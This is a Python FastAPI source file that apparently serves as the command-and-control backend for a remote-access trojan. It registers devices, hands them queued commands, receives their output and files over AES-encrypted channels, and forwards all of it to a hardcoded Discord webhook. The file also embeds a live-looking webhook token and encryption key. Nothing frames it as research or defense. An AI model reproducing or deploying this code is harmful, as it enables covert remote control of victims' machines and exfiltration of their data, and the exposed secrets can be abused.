import json
import base64
import requests
from fastapi import FastAPI, Request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = FastAPI()

# --- CONFIG (hardcoded) ---
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1400387627030413402/mLIB1zKmmG0wzmH_RykIJC5OW377QNKVlNLY_KZ04iWba1WwnZwioQZTiCb3FYDeekUs"
ENCRYPTION_KEY = "_XTLJunX4DlP94U6k--kZ2pm6HrPBXYUjLxKsiFmAWc=".encode()
# --------------------------

devices = {}

def decrypt_data(payload: str) -> bytes:
    obj = json.loads(payload)
    iv = base64.b64decode(obj["iv"])
    ct = base64.b64decode(obj["data"])
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def encrypt_data(data: bytes) -> str:
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return json.dumps({
        "iv": base64.b64encode(cipher.iv).decode(),
        "data": base64.b64encode(ct).decode()
    })

@app.post("/register/{device_id}")
async def register(device_id: str, request: Request):
    body = await request.json()
    info = json.loads(decrypt_data(body["payload"]))
    devices[device_id] = {"info": info, "last_cmd": "", "last_output": ""}
    requests.post(DISCORD_WEBHOOK, json={"content": f"🟢 Device {device_id} registered: {info}"})
    return {"status": "OK"}

@app.post("/upload/{device_id}")
async def upload(device_id: str, request: Request):
    body = await request.json()
    data = decrypt_data(body["payload"])
    try:
        text = data.decode()
        devices[device_id]["last_output"] = text
        requests.post(DISCORD_WEBHOOK, json={"content": f"📜 Output from {device_id}:\n```{text[:1500]}```"})
    except UnicodeDecodeError:
        # Could handle binary files here if needed
        requests.post(DISCORD_WEBHOOK, json={"content": f"📎 Binary file received from {device_id}"})
    return {"status": "OK"}

@app.get("/cmd/{device_id}")
async def get_cmd(device_id: str):
    cmd = devices.get(device_id, {}).get("last_cmd", "")
    devices[device_id]["last_cmd"] = ""
    return encrypt_data(cmd.encode())

@app.post("/cmd/{device_id}")
async def set_cmd(device_id: str, request: Request):
    body = await request.json()
    cmd = body.get("cmd", "")
    devices.setdefault(device_id, {})["last_cmd"] = cmd
    return {"status": "OK"}

@app.get("/list")
async def list_devices():
    return devices

# Entry point for Vercel
def handler(request, context):
    from mangum import Mangum
    return Mangum(app)(request, context)
